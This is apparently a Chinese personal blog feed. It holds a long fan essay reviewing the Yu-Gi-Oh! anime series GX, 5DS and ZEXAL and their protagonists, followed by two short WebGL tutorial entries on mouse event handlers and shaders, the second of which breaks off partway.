Judai</h3><p><s>Gotcha!</s><br><s>真正的英雄不需要朋友。</s></p><p>十代是几代主角里的一个异类，有着看起来不怎么会打牌的发型，唯一和背后灵从BE转HE的路线。相比于游戏和王样和朋友的羁绊，游星的5DS和过去满足队的友情，游马的后宫<s>教徒</s>，十代唯一称得上挚友的只有约翰了。女主是花瓶，所谓的“朋友”们全是拖油瓶，一个能打的都没有。</p><p>GX初期刚入学的十代，天真自信，相信决斗的快乐，即使输给了凯撒也没有感到沮丧。异次元篇后，遭遇同伴的不理解与指责，另一个人格出现的自己又亲手杀死了同伴，之后又和尤贝尔的灵魂的超融合，再次回到决斗学院后，失去了笑容(甚至头顶的呆毛都消失了)，萌生了退学的想法。同伴们虽然在他回来之前怀念他，但似乎没有人真正理解他的，明日香评价他神出鬼没，像是风一样。</p><p>有几个细节让我觉得他非常离群而孤独——异次元篇后，欧西里斯红宿舍只剩下他一个人，他拒绝晋升；校长的毕业讲话上，优秀毕业生是他的其他几个同伴，他很安静地鼓掌，这里让我觉得他太悲情了，明明其他人什么都没有做，拼上了性命去打败敌人的是他，但英雄的勋章并不属于他，而他也接受了这种命运。</p><p>darkness篇就更搞笑了，十代因为内心感到与他人的疏离而决定离开决斗学院，然而因为darkness的来袭和校长和斋王的挽留，被迫留在了学院，再一次拯救世界。毕业前，明日香找他告白，他装作没听懂。毕业典礼离开时，他跟尤贝尔说“没什么好告别的”。我说不出话了……英雄注定孤独？</p><p>一个异类的主角，外热内冷，后期虚假的社交笑暗示了内心的重重樊篱，他性格的缺陷犹如一种映照现实的真实，这也或许是那么多人喜欢他的原因吧。</p><p>  </p><h3 id="尤贝尔-Yubel">尤贝尔 Yubel</h3><p><s>尤贝尔的性别是尤贝尔</s><br><s>让你痛苦，这是想告诉你我有多么爱你</s><br>非常病和克系的一个人物，对曾经小学生时期的我的三观起了错误的引导作用(所以我后来还挺喜欢我妻由乃的<s>人外也很喜欢</s>)</p><p>虽然我现在也很喜欢尤贝尔，但没有童年的时候那么狂热了。大概是愚蠢的成年人越来越善于隐藏自己的感情了(不是</p><p>尤贝尔的病来自于上一世十代对他的承诺和这一世被十代亲自送上宇宙的痛苦，去掉外界影响后，他自身的真实性格有点毒舌又忠犬的感觉，不过还是有点病病的。</p><p>本来想解析一下自己为什么喜欢Yubel，但是想来想去感觉很难阐述，既有他本身人格的一些原因，又有他和十代之间那种羁绊感动我的关系，还有一些微妙的感觉。童年的一些情感已经很难再直率而真诚地表达了，不过有些直觉和偏爱会始终在潜意识存在。</p><p>热血少年漫的主角在结局最后成长成大人，踏上孤独的旅途，只有另一个孤独的灵魂陪伴着他。</p><p><a href="https://www.bilibili.com/video/av19293417">什么叫十尤十圣经·旧约啊</a></p><p><a href="https://www.bilibili.com/video/av84439157">什么叫十尤十圣经·新约啊</a></p><p>  </p><h2 id="5DS">5DS</h2><p>补5DS前，我对实卡最后的记忆停留在了某次去少年宫玩，路过小卖部买了包卡的时候。那时候开出了我看不懂的白卡，还有让人摸不着头脑的同调召唤。不过不妨碍我觉得白卡的龙还挺好看的，虽然同调召唤对那时候的我来说是十分高深的东西。</p><p>补5DS前，我像大多数初代二代遗老一样，停留在童年的情怀里，保持着DM/GX最牛逼的信念，没有补系列番的想法。但是看lofter时，发现了一些太太的六代系列漫画，突然就get了蟹哥的萌点，在一群搞事海星/天然黑水母/傻孩子龙虾/决带笑番茄/紧身衣冷漠工具人之间显得无比伟光正无害正直与可靠。加上星尘龙逼格高，还有什么不得了的流天类星龙，这么中二的名字，本龙癌蠢蠢欲动。</p><p>于是就开始了5DS的补番之旅。5DS的Riding duel一直是被人诟病的一点，很多人不能接受骑乘决斗，我一开始也觉得莫名其妙，为什么要无缘无故引入一张场地魔法和高速计数器，还把魔法卡限制于sp魔法卡，不过因为影响没有特别大，充其量可以看成村规，于是也没有特别反感。后来随着我追番下去，我逐渐思考，站立式决斗是前两代的主流，而5DS可能想做一些时髦值方面的尝试，于是引入了Riding duel，但莫名其妙的Riding必须要和决斗有关才站得住脚，于是又引入了场地魔法方面的机制，到WRGP的时候，可以看到这个机制又被完善了，高速世界升级成了2，先攻由第一个进入弯道的人决定这是一期就有的内容(不过到了WRGP把它作为规则固定下来了)，还有开车速度影响高速计数器的数量，甚至来不及交接时甚至会导致比赛的失败。这么一看，Riding duel是有它自己的一套完整的机制的，而且游戏性也确实存在，时髦值也upup。一开始大家对骑乘决斗的歧视，可能是不了解它后面那一套比较完善的与决斗有关的规则，以为只是与决斗无关的没有意义的尴尬设定。而且可以看到，到了剧情后期，同调召唤的进化甚至和车速挂钩了，要是没车，你很难想象蟹哥一个人飘在宇宙里召唤流天类星龙的画面。总之补完番，我推翻了自己原先对Riding duel的偏见，这确实是一个成功并且时髦的设定，在蟹哥的人设，蟹秋感情的进展，结局的各奔东西处都发挥了很多作用。</p><p>可能是主角性格影响与奠定故事基调的关系，和DM的不断寻求真相(不是很了解，感觉是这样)，GX的十代从天真走向成熟这两个主线比起来，5DS更多是一种正统的青年向热血拯救世界的故事，没有少年向的那种狼狈与跌宕起伏。蟹哥一直很成熟，没有十代的那种明显的失落回归又成长的心路历程，遭受打击最大的也不过是差点败在鬼柳那里和普拉西多的同调封印。蟹哥从头到尾决斗一直很强，你很难看出他进步了什么地方(除了同调到加速同调再到明镜止水之心这种印卡技术的进步)，感觉第一集就是完全体了。反观十代与ZEXAL的教主，十代一开始的决定构成十分简单，人也很天真，基本是不带脑子快乐打牌，快乐就完事了。教主就更别说了，前几话差点没被人喷死渣操，他们两人都有一个明显的成长历程。蟹哥一直很稳，除了回忆杀输给杰克(这是剧情杀吧我觉得)，牌组很给力(世界冠军卡组)，技术很给力，一串三不在话下，会说书会嘴炮会脑内combo。而且蟹哥的队友们也暖心(十代：我做错了什么？)，所以5DS的剧情也是那种很稳定的发展。我追番时也会感觉到一个很明确的主线任务，主角们稳定地向那里迈进，一般没有多少神转折，各个篇章的内容重量也还算均衡，但你看GX，异次元篇的突兀和沉重，ZEXAL第二季的超展开，5DS蟹哥相比起来就是一个靠谱的成年男性。追番的时候我心情一直是比较平稳的，没有大悲大喜，很安定地期待着故事进行。唯一一次哭大概是结尾的时候，5DS展现了现实的成人世界，所有人的人生并不会天真地以决斗为中心，曾经的同伴们也将各奔东西，如果它只展示到这里就好了，我可能就不会哭了，因为老套而不落俗的少年故事大多都是这样结尾，相当于虚幻的开放式结局，未来任凭美好地想象。但它偏偏要中间倒叙插入一段多年后大家的生活，成为了医生、国外留学、退出职业赛队、成为个人决斗者、留在原点继续研究，这样的真实而不同的人生，我明明是想补番来逃避现实的，结果又提醒我想起了现实，就好像在告诉我，你看，再中二的记忆都会成为过去，你的生活终将抛弃以娱乐为中心的构成，你要去面对、去拥抱现实。大概是这样的有点真实的残酷，对死宅来说。传递了它作为非子供向动画的一些价值内容。</p><p>作为偏成人向的内容，5DS的故事平稳，但平稳有时意味着容易倦怠，所幸它的人设与决斗构成十分优秀，蟹哥就不说了，之后单独分析。杰克从一开始的中二之王转向后期的谐星担当，这个过程发生的事情十分有趣，一开始我以为他是社长那种风格的，毕竟长得也有点像，但后来各种翻车、乱花乌鸦麻麻的钱233、孩子王属性，还有和小丑的拉面故事发生共鸣感动的那一段，都让这个人物的塑造变得多面立体而有趣，而且他是个固执得有点Baka的家伙，结局处是他那种天真而固执的对梦想的追求点醒了所有人，那一段关于理性与羁绊的发言真的相当有特色并且很有趣。克罗，或者叫他乌鸦，因为人物塑造得太好导致人气太高，硬生生逼迫剧本把他从边缘人物提升到男二地位，5DS变成6DS，乌鸦应该是这一代放水最多的人了吧，装鶸放水的迫真演技真的太可爱太吸粉了，而且性格很可爱，布鲁诺刚来时吃醋那一段我笑死了。十六夜秋，本作女主，也是六代YGO最能打的女主(甚至可能是人气最高的我猜)，黑蔷薇龙强无敌，曾经是一代炸场神器，某种意义上她可能是乌鸦戏份改变的牺牲品？(我猜的)这么吸粉的黑蔷薇龙竟然没有进化体。也可能是直男编剧的锅，前期魔女形象塑造的很好，后来洗白后也很可，但是戏份后面(决斗方面)真的太路人了，基本就WRGP上场了一次，还是辅助的那种。前期你塑造了那么久的黑蔷薇龙和魔女形象，后期怎么就不知道用一下啊，辣鸡编剧。这个有点意难平。虽然相比起其他几部女人局外人-战五渣-工具人等形象要好得多，但YGO系列的女性人物真的让人吐槽，过于平面刻板，即便是第四部说出了“只把女性作为学会饰物的人们而已”这样让人感慨YGO终于想摆脱性别刻板印象了的神代璃绪，也还是回到了被绑架-让人来救-再次被绑架-让人来救这样的工具人套路当中，令人无语凝噎。除了这个之外倒还好，只是这一点瑕疵实在有点可惜。后期天降的布鲁诺让我想到了十代的约翰，发色发型都有点像，而且是很讨喜的弱气和天然黑的属性。<s>但是死得太剧情杀了，我不接受，蟹布szd。</s></p><p>5DS的决斗构成我真心觉得超神，首先可能是同调召唤本身时髦值加成的关系，比起亏卡亏到死的仪式和融合需要不断想方设法补充手卡，同调不需要这个刻意的剧情点，就减少了说书的冗余，提升了说书的技术含量。再接着，召唤词这个想法太时髦了，加上这部是K社龙癌发作的一部作品，召唤词+龙那是时髦值MAX啊，有多少人不会同调召唤但会背星嫁的召唤词的，这就好像白嫁是社长的信仰一样，召唤词就是说书的灵魂所在。</p><blockquote><p>聚集的祈愿将成为新生的闪耀之星，化作光芒闪耀的道路吧！同调召唤！飞翔吧，星尘龙！</p></blockquote><p>虽然早期蟹哥的决斗有重复套路的嫌疑(过劳死罢工抗议)，但到了后期，各种效果连锁陷阱连锁无效连锁，脑内combo，出场大量的特效加成，Riding的疾驰刺激感，场地魔法效果的各种利用与反击，都让决斗构成的复杂性和观赏性上升了一大截。V6作哥也说书，但繁长的过于贴近OCG环境的说书(我看过一个作哥单回合5min的说书cut！5min？！！)让人昏昏欲睡，而5DS在说书和决斗构成间找到了平衡点。虽然DM之后所有续作都被笑称为卖卡作，但即使卖卡也应该有诚意，我觉得其他几部兄弟作品应该向5DS学学，不要一味地推超模卡，好歹跟剧情联系紧密一点吧。我看了蟹哥的说书，我就很想买魂卡星嫁，我也很想中二地念召唤词，组一套废二。(最近很喜欢黑羽，在dl上艰难地抽黑羽)</p><p>如果说GX主推的是与卡牌的羁绊，那5DS主推的就是伙伴之间的羁绊，蟹哥的队友真的都好棒，这种燃系热血番如果只靠主角一个人推怪是很没意思的，但是5DS做到了主角和同伴一起前进，无论是打暗印者也好，WRGP组队也好，弧线摇篮篇三个方向的推进也好，每个人都能在主线任务中献出力量，这也能更好地塑造角色自身的形象。最后蟹哥召唤流天那里，所有的龙出现，聚集成新的力量，简直是教科书式的燃。</p><p>总之整个5DS看下来，感觉就是稳、完整，私心觉得同调是历代最时髦的召唤方式。如果除去情怀的加成，5DS称得上前三代最佳，DM败于那个年代的画质影响，还有刚开始探索这块TCG领域时规则方面的欠缺和口胡，GX败于剧情上各篇章之间的撕裂感、前期灌水有点多、特效也没有5DS良心，5DS在决斗方面做到了最好，开创了辉煌的同调时代，一回合三流天的梗大概是很多牌佬的青春？5DS相比这两代欠缺的可能是剧情上的跌宕起伏，但他确实讲好了一个故事，没有大的瑕疵。</p><p>不过5DS也有一些地方值得吐槽。虽说是5DS，到了后期成了6DS，前期第五条龙一直神隐，生命激流龙从ED1就出现了(life is beautiful这个名字太草了)，一直打酱油到了快结局才出现，改剧本改得太明显了。剧本的更改使得设定出现bug，黑羽龙的加入一直没有交代清楚原由，好歹把设定圆回来吧，还有红龙多出来的那个萝卜真是槽多无口。杰克和卡莉的感情线也是，暗印篇爱得要死要活，复活后仿佛失忆，仿佛什么都没发生过？真实意难平。秋姐后期的路人感吐槽过了。杰克的红莲新星龙的背景设定也有点随意，与其设定一个新的神，为什么不干脆深挖一下原有的红莲魔龙这条线呢？5DS动不动5000年10000年的追溯，你不是和DMGX一个时间线的吗，哪来的那么多妖魔鬼怪。</p><p>以及，5DS的作画是一个大问题，隔几话大崩一次，各位作监之间的风格差距有点大，非常明显的一点就是有几个作监那个脸上的黑线一大片一大片的，我觉得你用黑线表示阴影可以，但不要这么滥用吧？或者你们风格能不能统一一下，一话全是黑线，然后下一话又变回清秀小美人，迷惑。以及邪神作画大量出没，我这个从来不关注作监的人，从补5DS开始也有了看每话作监的意识。那个大邪神、崩坏担保，说的就是你，高桥和德，为啥DM时期和加加美的风评那么好，到了5DS就是崩坏担保了，你很难看到他不崩坏的部分，各种奇怪的表情、人体结构大量出没。不只是高桥和德，一大批作监都有崩坏的陋习，作画一点都不稳定。这算是我最不喜欢5DS的地方了。</p><p>对了，还有一个我觉得有点不爽的地方，5DS中断的决斗有点多，导致原本铺垫得很好的局势虎头蛇尾。又或者是一些决斗打到后期，敌人忽然被洗白或者自我醒悟，然后表现出一种甘愿认输的倾向，比如和暗印者里那个姐姐打，后期就感觉很奇怪，实力一下子掉档。</p><p>关于音乐方面，我印象深的倒不是很多，即使是蟹哥的clear mind，我也没什么感觉，倒是觉得蟹哥的处刑曲更燃一点。</p><p>整体差不多吐槽到这里，可能是因为刚看完没多久，一不小心爆字数了，我对5DS真是爱得深沉。</p><p>  </p><h3 id="不动游星-Fudo-Yusei">不动游星 Fudo Yusei</h3><p>蟹哥名字的发音跟武藤游戏真的好像，不知道是不是故意的。</p><p>蟹哥一开始的人设很无口，满脸写着冷漠，一话除了决斗讲不了几句话，差点就成了后来的作哥了，也可能是cv刚上手的关系。后来到了克罗出场那一话，蟹哥一下子变得炒鸡开朗，果然这就是基友的力量吗。还有5DS满足队这个设定真的超搞笑，每次回忆杀的时候都是满屏幕的“黑历史”和“羞耻”，为什么你们不会笑出来啊我真是笑得捶床了哈哈哈哈。除了无口蟹，还有进了酒吧点了杯牛奶的milk蟹(后来zexal里的阿里特干了同样的事情)，被捆绑电击的SM蟹(这就是你的本子比女主多的原因？)，打架超厉害·一拳两三个·蟹升拳·蟹(论历代最会打架的男主)。后来的蟹哥逐渐失去了无口这个最开始的设定，变得话多嘴炮了起来，对于我这种无口爱好者是一个遗憾。</p><p>蟹哥在同人里的设定一般都是最老实的那个人，该说不愧是靠谱的成年男性吗。蟹哥有时候有一些奇怪的坚持，呆呆的又很萌的感觉，比如和鬼柳一起挖矿那里，简直是对别扭小孩的神器。蟹哥有种天然黑的潜质，但我又觉得称不上天然黑，如果和十代比起来的话，他只是个人的经历比较丰富复杂，沦落到卫星区、在满足队当混混、后来从垃圾堆里捡零件和卡组、自学机械工程做D轮、到了新童野市还是每天忙忙碌碌地做机械和程序。他和布鲁诺熬夜写代码那一段让我觉得很亲切，两个人基本没怎么睡觉，写完了才躺下。看过一个画各代主角睡相的漫画，十代和教主是梦里还在决斗，番茄和作哥则是一直做噩梦，轮到蟹哥——还在写代码，头上一个对话框(快去睡。)，哈哈哈超好笑。总之蟹哥的经历让他显得特别成熟寡言，但又不是黑的程度，因为他自己还是那种比较正义的性格(十代不要装无辜了，天然黑的教科书就是你)。</p><p>反正就是，比起其他几代各种问题儿童，蟹哥这种乖小孩(?)会显得特别可爱，有自己独特的萌点。</p><p>  </p><p>其他人物之前提过一点了，还想补充的也不多。其他人里我最喜欢的应该是乌鸦，非常有生活感的一个人，做饭送快递当麻麻，对游星在搞的东西一窍不通那段很可爱很真实哈哈哈，也是本作的孩子王之一，小孩子们给他应援那一段很感人。以及虽然是脸上印记最多的人，意外得没有很痞。打牌比杰克这个男二靠谱，毕竟是冠军卡组黑羽吧哈哈哈。</p><p>  </p><h2 id="ZEXAL">ZEXAL</h2><p><s>讲个笑话，ZEXAL是子供向动画</s></p><p>我是被一个剪辑视频带入ZEXAL坑的，里面剪的是游马和Astral的故事。这种跟DM和GX相似的背后灵的设定非常戳我的萌点。于是毫不犹豫地入坑了。</p><p>经历了5DS这种青年向的故事形式，ZEXAL一开始我非常不适应。可能因为是子供向的关系，官方一开始出的几话都是教学集，基础到教导你魔法卡陷阱卡等怎么用，习惯了蟹哥高端说书的我有点无力吐槽。好在我对ZEXAL的期待值很高，也知道后续剧情的展开还不错，再加上教主是历代最小的主角(13岁可以宽容)，我寻思着这应该是一个成长向的故事，类似GX那样，只不过起点比十代低，于是也就看了下去。</p><p>Astral的存在很有趣，教主是一个话多的需要倾听对象的人，所以这两个人在一起太搭了，而且游马的成长需要一个导师类型的人物。</p><p>曾经看过一个假说，DM和GX是同一个世界线，但以零点反转为分支点，分化成了5DS和ZEXAL两个时间线，一个是发生了零点反转，游星他们拯救世界和ZONE他们失败的世界线，另一个是ZONE他们成功阻止同调、抹杀零点反转的世界线，也就是ZEXAL世界观。这大概可以解释ZEXAL为什么完全没有同调召唤存在的痕迹，就连决斗庵里的代表怪兽木雕也只有DM/GX的。</p><p>ZEXAL是一个以超量为主的世界观，超量相比同调某种意义上更简单(我觉得)，只需要特定数量的相同level的怪兽就可以召唤，而同调需要至少一只具有&quot;同调&quot;属性的怪兽，而且凑星数有时候挺麻烦的，而超量完全可以构造一副纯R3或R4的卡组，卡组构筑方面我觉得相对简单一点(菜鸡玩家发言)。比起同调而言超量确实更容易理解。以及和之前任何一种召唤方式都不同的是，作为超量召唤的素材会叠放在超量怪兽下，一开始我在ygopro里碰见这种放卡方式的时候超疑惑的，不过理解之后还是挺简单的。就动画初期超量的表现来看，我觉得超量素材是超量的一个很大的限制因素，一些怪兽用完素材之后就变成白板没有效果了，给人感觉强度上好像不如同调。</p><p>先讲讲我对ZEXAL决斗构成的感想好了，一开始出于教学的关系，开头几场的决斗构成都很简单，我觉得把鲨鱼作为第一个被教主打败的人是个败笔，怎么说也是个亚军，被一个刚学决斗的菜鸡给打败了，后面每次都是根据剧情需要让鲨鱼赢或输，完全看不出这个人真实的决斗水平到底是怎样(鲨鱼真实工具人)。后来快斗出场，快斗大概是亲儿子，决斗水平从开始就保持在一流水准，到结局都没输过教主。值得吐槽的是快斗的卡组，每次基本都是一开始就上光嫁，是在向社长致敬吗？R8的银河眼也是说来就来。出于一个菜鸡玩家的感受，5DS和ZEXAL的卡效果差距过大，感觉ZEXAL动不动就出超模卡。相比于5DS比较多的连锁，感觉ZEXAL更多时候是靠卡效碾压。而且有一个值得诟病的地方，感觉后期的敌方怪效果有一万个字，发完一个又一个，flag倒一个又立一个，根本记不住，如果OCG化卡面真的写的下吗，最后还不是砍了一堆？感觉完全是为了塑造敌方的强大形象而塞了那么多效果，但这根本不是决斗啊？过于超模和繁琐的效果导致我看ZEXAL决斗的兴趣不大。最后决斗往往会变成两边互相印卡，说到印卡，我觉得教主的ZEXAL模式槽点太多了，闪光印卡要不要太嚣张啊(特别是那个台词，balabala什么最强决斗者的一切都是必然的)，5DS好歹也就印几张额外吧。教主印卡就算了，和贝库塔打的那场直接改卡(住手，这根本不是决斗！)，我觉得是和ARCV的动作卡一样洗不白的黑点。游戏王本身的主要构成就是决斗，在决斗里印卡改卡无异于破坏游戏规则，直接消耗了观众热情啊。</p><p>我觉得导致教主频繁印卡的一个直接原因就是他自己的卡组本身强度太低，如果不用A娘的卡，自己连一张超量怪都没有(虽然结局的时候自己印了张No.0)，强力的卡都是印出来的而且也不归自己，史上最弱主角卡组钦定。而你看看蟹哥的，不印卡之前就有一只星尘龙和其他一堆过劳死同调怪，而且效果都还不错，起点就比教主高很多。而失去了No的教主卡组就是一条咸鱼，最后和A娘打就变成拿一堆咸鱼各种苟，感觉观赏性很差，时髦值downdown。</p><p>总之我自己确实不太喜欢ZEXAL的决斗部分，好在这一部吸引我的也不是决斗，有时候打个盹进度条一拖也就过去了。下面来讲讲剧情好了。ZEXAL第一季的剧情主要是围绕WDC展开，快斗在这一季应该是当之无愧的男二吧，鲨鱼这一季的实力和存在感还没那么强。WDC开始前有一些日常的搜集No的剧情，快斗在这一部分刷足了前期作为反派的时髦感，然后冷漠的人设与弟弟面前那个温柔的弟控相互映衬，人物形象一下子就立体了。这中间还有很多教主攻略别人的决斗(。)，为大后期这群人送死做铺垫(。)。WDC决赛开始前，玉座一家的出场的剧情是高潮部分，这部分剧情把快斗和鲨鱼都牵扯了进来，玉座家三兄弟的人设也很有趣。而且玉座一家、快斗一家、游马一家、以及鲨鱼兄妹，这些人之间的贵乱关系真是相当错综复杂。等到打进WDC，虽然玉座等人的各种卡效果爆炸，打牌打起来还是挺好看的。教主打牌打着打着顺便把快斗也攻略了(。第一季末尾1V3那场也还可以，就是感觉ZEXAL的多对一规则对人少的那个不公平，卡差太大了，还是超融合剧场版规则公平一点。总之第一季就在快斗愉快地暴打教主后(被攻略后)结束了。</p><p>总体来看，第一季前期为了铺垫人物出场等做的过家家日常有点无聊，中期虽然主线逐渐展开，一些插入的日常表现也不是特别优秀，等到突入WDC后，节奏才开始变得紧张。总而言之中规中矩。</p><p>第二季开始进入巴利安节奏，影帝真月零加入队伍。总之一路高能，从这里开始决斗就开始变得可能会死人了。96颜艺巅峰，138我哭了好几次。中间还经历了Astral的“死亡”，教主那一段自闭看得我太痛苦了。不知道是不是我的错觉，教主快黑化的时候瞳色会从鲜红色变得暗红，非常黯淡血腥凝固的红色，虐死我了。我总感觉教主要走上十代的老路，但还好教主是那种积极抗压的性格，虽然后面伙伴一直在死去(快斗shark你们死得好惨啊)，教主也一直哭一直哭，但至少坚持下来扛过来了，身边几乎所有人死去的痛苦，承受着这样的命运还是没有黑化，教主和十代果然是不同的人啊。如果说GX后期是用所有角色形象的葬送来塑造一个十代，那么ZEXAL后期就是所有角色自愿用自己的死亡来让游马成长。</p><p>印象特别深的是快斗临死前对游马说的话：</p><blockquote><p>游马，好好记住，谁都会面临分别，总会有一天，突然的，你和Astral也不例外。因此，先从和我分别开始适应起来吧。</p></blockquote><p>啊，文艺的大斗哥也擅长发刀啊。</p><p>还有138的贝裤衩，虽然因为你欺负教主，我超级超级超级讨厌你，不过这一集就原谅你一次：</p><blockquote><p>到底要多老好人啊，真蠢。我没法拖你一起走。<br>永别了，游马同学。</p></blockquote><p>不得不说，这样的死亡也升华了这些人物，而GX里对应的则是人物的全盘崩塌。ZEXAL是一场涅槃重生，GX就是为了成全一个人的献祭。</p><p>最后的结局是教主和A娘的对决，Astral看穿了教主失去朋友的悲伤，但是教主不愿意动用源数代码去改动世界线，所以A娘扮演反派挑起与游马的决斗。决斗的主题到最后揭示出来也是与GX类似的，不要忘记决斗的快乐。最后世界线变动，差点成为遗像子供番的ZEXAL终于迎来了一个HE。虽然很多太太都很悲伤地觉得HE没有这么容易得到，这是Astral伪造的一个梦境或者需要Yuma付出什么才能得到，不过我也不多想了，我愿意相信这个HE。谁还不是爱吃糖的成年人呢TUT</p><p>虽然ZEXAL的决斗构成在我看来是残废，但是剧情跌宕起伏够深黑残(我吃刀子吃得很开心(吐血))，游马虽然只有13岁但是展现了圣子般的光辉(非贬义)，教主这个称号当之无愧。熬过前期小白日常剧情，ZEXAL与5DS相比，也有它的独特闪光之处。</p><p>吹完了剧情，让我再来婊婊ZEXAL。ZEXAL有一个非常大的剧情硬伤，也是让很多人诟病的一点，角色洗白得太突然了。前期铺垫了那么久的菲卡BOSS，用尽各种手段和角度展现他的无情冷漠一心向科学，突然被打败后就变成了一心为小儿子的慈父，毫无逻辑，与前面剧情矛盾成山，为洗白而洗白也太恶心了，呕呕。玉座的洗白不予评论，我只是觉得他救人那里干嘛要表现得那么像坏人，编剧你以为突然变白可以给观众带来惊喜吗，呕呕。贝库塔这个人物有点复杂，不过我觉得他没洗白。</p><p>小鸟女主的大正宫地位不可动摇，但编剧你不要因为她是女主就让她到哪里都跟着呀，就这么缺一个解说役吗！而且仗着不会打牌就不会死人，所以连巴利安世界都让她跟着去啊？！认真的吗？！我前半句是吐槽呀！虽然小鸟真的很可爱，但是打的很危险的地方站着一个不会打牌的女孩子还在一边解说真的有点出戏呀！</p><p>以及，不知是不是因为子供向的原因，ZEXAL的风格是真的幼齿啊，教主不明所以的发型......像极了小学生爱看的动画片的男主(讲道理那些男主的发型也比教主好看吧)。所幸教主个人魅力克服了这个缺点。其实我也不怎么喜欢鲨鱼的发型，感觉美颜被这个章鱼发型耽误了。以及ZEXAL的配色，教主的一帮初中同学的人设——小鸟绿油油的发型，cat好像可爱又好像不可爱的外型，胖虎和小夫就不说了(bushi)……城市的配色也是各种高饱和度混杂的幼齿审美。</p><p>不过相比5DS各种作画邪神出没，ZEXAL的原画是真的好！很少看到崩坏的作画，而且我还发掘了一个神仙作监太太——横田明美女神！她笔下的人物，特别是斗哥，又帅又美，而且可能因为是女性审美的关系，她的人物都会偏向圆润可爱(比如这篇文章封头的三妹！)，但也不会缺乏帅气！而且很少看到过于夸张的兄贵。像ngb虽然也被夸作画完美，但他有点偏向肌肉兄贵的男性审美，这部还不是特别明显，到了作哥那一代，感觉作哥虽然是个美人，但是是一个可以一拳打飞十个我的大美人，奇怪的感觉呢……不是我很能接受的风格。可惜横田太太在v6只负责到40多集就跑到另一个番打工去了，对v6真是一个大损失啊。</p><p>ZEXAL也有两首我特别喜欢的歌曲，一首是OP2&lt;BRAVING!&gt;，非常燃的一首歌。还有一首是最后一个ED<Challenge the game>，也是官方御用送葬曲。因为这个ED正值ZEXAL死人最多的时候，当话死的人都会被剪辑一番之前的出场，替换原先的ED画面，官方送葬，官方飞刀，刀刀见血。每次听到这首歌都会有点丧。(小美人们你们死得好惨啊5555)</p><p>  </p><h3 id="九十九游马-Tsukumo-Yuma">九十九游马 Tsukumo Yuma</h3><p><s>一飞冲天啊，我！</s></p><p>13岁！历代最小的决斗王！(SEVENS是什么我不知道)</p><p>你以为ZEXAL是游马的成长升级故事，其实是游马的后宫攻略故事哒！</p><p>拥有全系列最大的后宫，男女通杀，连爸爸的朋友都不放过(bushi)</p><p>打住，我正经一点。</p><p>第一次见到游马，感觉这个主角不是我喜欢的类型，有着和蟹哥一样黑的肤色但没有蟹哥的帅气和无口可爱属性，发型的奇怪程度堪比武藤游戏但又完全不及人家的时髦值，明明是和十代一样的“不动脑子”快乐决斗玩家，真的打起来却蠢爆了。总之第一印象，你真的是主角吗？给我A娘让个位置谢谢。</p><p>奇怪的口头禅“一飞冲天”，这个cv的声音念这句真的感觉怪怪的，有种出戏感。</p><p>游马一开始并不是完全的正面形象，明明不会决斗，对A娘的指点不屑一顾固执己见导致失败；对恶人之心完全没有洞察力，天真幼稚得仿佛三岁小孩一骗就上钩了；明明说要不带No挑战鲨鱼，最后还是用了No，违反了自己口口声声的承诺，超掉粉啊这里，弹幕一片不屑，好多人扬言要弃番。本来也想大喷一番的本喷子看到这么多粗鄙之言，感觉游马被骂的有点可怜，这才忍住没喷。</p><p>虽然真的很想骂人，这什么**主角，但想想也很真实，毕竟他只有13岁啊，毕竟这一代是偏向成长路线的，不停催眠自己，会长大的会长大的，消气了。只不过是因为这个后辈恰好紧跟在最年长的蟹哥后面，这对比太可怜了。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ygo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>孤独的WebGL之旅(三) | 响应函数</title>
      <link href="/2020/01/23/webgl3/"/>
      <url>/2020/01/23/webgl3/</url>
      
        <content type="html"><![CDATA[<p>动态绘制过程中不免会用到鼠标或键盘的响应函数。之后进入三维世界，我们将通过鼠标改变场景的视角，通过键盘实现在场景中的漫游。在这一章只是先介绍一下鼠标和键盘的响应函数，等我写到三维世界，再回过头来补充具体的漫游相关。</p><span id="more"></span><p> </p><h2 id="鼠标响应">鼠标响应</h2><p>我们可以通过<code>&lt;canvas&gt;</code>对象来注册鼠标响应函数。</p><p>比如鼠标的点击事件，代码可以如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//注册鼠标点击事件响应函数</span>canvas<span class="token punctuation">.</span><span class="token function-variable function">onmonsedown</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">ev</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">click</span><span class="token punctuation">(</span>ev<span class="token punctuation">,</span> gl<span class="token punctuation">,</span> canvas<span class="token punctuation">,</span> a_Position<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当发生鼠标点击事件时，就会调用click函数。这样的写法是匿名函数的写法，好处是可以获得main()函数内部的一些变量，比如gl, canvas等。而click()函数的实际定义是在main外部的。</p><p> </p><h2 id="参考资料">参考资料</h2><p>[1] 《WebGL Programming Guide》Kouichi Matsuda, Rodger Lea</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>孤独的WebGL之旅(二) | 着色器</title>
      <link href="/2020/01/23/webgl2/"/>
      <url>/2020/01/23/webgl2/</url>
      
        <content type="html"><![CDATA[<p>着色器作为最重要的概念之一，怎么可能只有上一章那么点内容呢。</p><p>这一章将继续深入着色器相关概念，但涉及较少的实例程序部分，后续若有深入的着色器概念，也会在这一章补上，不再分开叙述。</p><span id="more"></span><p> </p><h2 id="initShaders-函数解析">initShaders()函数解析</h2><p>initShaders()函数虽然放在了函数库里供调用使用，但如果想深入了解WebGL，内部细节还是需要了解的。其大致可分为七个部分。</p><ol><li class="lvl-3"><p>创建着色器对象</p></li></ol><p>通过gl.createShader(type)函数创建着色器对象，type参数可传入gl.VERTEX_SHADER或gl.FRAGMENT_SHADER，指定创建的着色器类型，为顶点着色器或片元着色器。可以通过gl.deleteShader(shader)来删除着色器对象，如果该着色器还在使用，则删除无效。</p><ol start="2"><li class="lvl-3"><p>向着色器对象中填充着色器程序的源代码</p></li></ol><p>通过gl.shaderSource(shader, source)函数向着色器指定GLSL源代码，也就是上一章一直强调的要传入的字符串形式的GLSL代码。</p><ol start="3"><li 